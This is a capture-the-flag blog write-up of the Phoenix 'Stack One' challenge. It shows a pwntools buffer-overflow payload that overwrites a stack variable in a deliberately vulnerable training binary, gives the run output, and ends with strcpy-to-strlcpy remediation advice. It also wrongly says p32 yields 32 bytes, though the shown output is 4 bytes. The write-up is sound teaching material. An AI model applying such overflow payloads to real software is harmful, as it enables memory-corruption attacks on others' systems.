---
title: "Phoenix Challenges - Stack One"
date: 2022-08-06T20:00:00-00:00
categories:
  - CTF
  - Phoenix
tags:
  - Phoenix
  - CTF
---

<div style="text-align:center">
  <img src="/assets/images/post_images/Phoenix/phoenix.png">
</div>

# The Challenge
The challenge’s description and source code are located [here](https://exploit.education/phoenix/stack-one/). It and all other Phoenix binaries are located in the __/opt/phoenix/amd64__ directory. A [previous blog post](https://secnate.github.io/ctf/phoenix/phoenix-setup/) describes how to set up the Virtual Machine for these challenges, if that hasn't been done already.
{: style="text-align: justify;"} 

# The File
We use the following command to get a sense of the _Stack One_ file’s properties:
{: style="text-align: justify;"}
```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ file /opt/phoenix/amd64/stack-one
/opt/phoenix/amd64/stack-one: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

Some fun facts:

1. It has the `setuid` property enabled, which indicates that the program is run with the privileges of the owner. If a file’s owner is root (and it isn’t in this case), it can be used to escalate privileges
2. It has symbols, as indicated by the `not stripped` attribute. It means that those debugging and analyzing the binary can see the original variables and function names
3. It uses shared libraries that are dynamically linked as part of its execution. This can help to identify standard functions used
4. It is an `ELF 64-bit LSB executable, x86-64`. ELF is the file format, the word size is 64 bits, LSB means that it is little-endian (least significant bytes used first), and the binary uses the x86-64 instruction set
{: style="text-align: justify;"} 

# Objective
Looking at _Stack One’s_ C code, we see the _changeme_ variable stored in the _locals_ struct initialized to 0. The goal is to tamper with its value and make its value equal to `0x496c5962` to print the desired statement.
{: style="text-align: justify;"}

# Related Concept
It is necessary to understand how Stack memory works. I wrote a lengthy explanation in the [writeup for the Phoenix Stack Zero challenge](https://secnate.github.io/ctf/phoenix/phoenix-stack-zero/), which one can read if interested.
{: style="text-align: justify;"}

# The Bug
All of _Stack One’s_ data is stored on the stack, with the _locals_ struct’s buffer and _changeme_ variables being adjacent neighbors. Excess data rammed into the _buffer_ will spill over into the _changeme_ variable and affect its value. This spillover is caused by _strcpy()_ function, which writes the _Stack-One_ binary’s argument into the _locals.buffer_ without any bounds-checking.
{: style="text-align: justify;"}

# The Exploit
The _locals.buffer_, into which the input is written, has space for 64 characters. Since the _locals.changeme_ variable was 0 originally, the exploit needs to tamper with its memory location to make it have the desired `0x496c5962` value. This is done by feeding in an input string of 64 characters to completely occupy the buffer’s memory and appending additional data to overwrite the _changeme_ variable with the `0x496c5962` value.
{: style="text-align: justify;"}

I needed to completely fill up the _locals.buffer_ 64 characters and ensure that the appended value could completely control the _changeme_ variable. Fortunately, the _Stack One_ binary had printouts, which attested whether the _locals.changeme_ variable was equal to `0x496c5962` and printed its value if it wasn’t. Convenient
{: style="text-align: justify;"}
```
if (locals.changeme == 0x496c5962) { 
  puts("Well done, you have successfully set changeme to the correct value"); 
} 
else { 
  printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n", locals.changeme); 
}
```

I started by crafting a basic exploit. Its payload in the [_exploit.py_](https://github.com/secnate/Exploit-Education-CTFs/blob/main/Phoenix/stack-one/exploit.py) file’s line 14 was
{: style="text-align: justify;"}
```
payload = cyclic(64) + p32(0xdeadbeef)
```

What does it mean? Pwntool’s _cyclic(64)_ command generates the following cyclic padding string
{: style="text-align: justify;"}
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
```

While the characters themselves do not have an intrinsic meaning, its main benefit is that each possible sequence of 4 bytes corresponds to a unique string index. This expedites the process of exploit development through ease of debugging and adjusting padding string offsets.
{: style="text-align: justify;"}

The p32 function is pwntools’ packer utility. It takes the provided integer input (0xdeadbeef in this case) and converts it to a bytestring representation of length 32 bytes and the appropriate endianness. Because the _Stack One_ file is little-endian, it represents **0xdeadbeef** as a **b'\xef\xbe\xad\xde'** bytestring.
{: style="text-align: justify;"}

The following bytestring payload was thus generated:
```
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\xef\xbe\xad\xde'
```

The next step was to test whether the payload's launch _completely_ overwrote the _changeme_ variable with 0xdeadbeef.
{: style="text-align: justify;"}

```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ ./exploit_with_debugger.py
Launching The Stack One Exploit!
[!] Could not find executable 'stack-one' in $PATH, using '/opt/phoenix/amd64/stack-one' instead
[+] Starting local process '/opt/phoenix/amd64/stack-one': pid 4703
[*] Switching to interactive mode
[*] Process '/opt/phoenix/amd64/stack-one' stopped with exit code 0 (pid 4703)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0xdeadbeef, we want 0x496c5962
[*] Got EOF while reading in interactive
$  
```

It did! The final step was to replace the payload’s `0xdeadbeef` value with `0x496c5962` – and lo and behold!
```
nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ ./exploit.py
Launching The Stack One Exploit!
[!] Could not find executable 'stack-one' in $PATH, using '/opt/phoenix/amd64/stack-one' instead
[+] Starting local process '/opt/phoenix/amd64/stack-one': pid 4717
[*] Switching to interactive mode
[*] Process '/opt/phoenix/amd64/stack-one' stopped with exit code 0 (pid 4717)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
[*] Got EOF while reading in interactive
$  
```

The exploit code can be found in my [Github repository](https://github.com/secnate/Exploit-Education-CTFs) for Phoenix challenge solutions.
{: style="text-align: justify;"}

# Remediation
To prevent such a memory corruption bug, I would urge developers to not write in C and to transition to memory-secure languages such as Python or Rust.
{: style="text-align: justify;"}

If there is no choice but to use C, I would caution against using the [strcpy](https://www.geeksforgeeks.org/why-strcpy-and-strncpy-are-not-safe-to-use/) function to extract command-line arguments or inputs. As just seen, it continues reading the input until the terminating NULL (‘\0’) is seen, regardless of the destination buffer’s size.
{: style="text-align: justify;"}

The [strlcpy](https://man.openbsd.org/strlcpy.3) function should be used instead. It writes the input into the destination buffer up to the specified size and terminates the buffer with the NULL (‘\0’) character. Convenient, because many programmers would just forget to do so manually.
{: style="text-align: justify;"}

The source code’s `strcpy(locals.buffer, argv[1]);` line would thus be
{: style="text-align: justify;"}
`strlcpy(locals.buffer, argv[1], 64);`
{: style="text-align: center;"}

---
That’s all for this round. Stay tuned for the next challenge!
{: style="text-align: justify;"}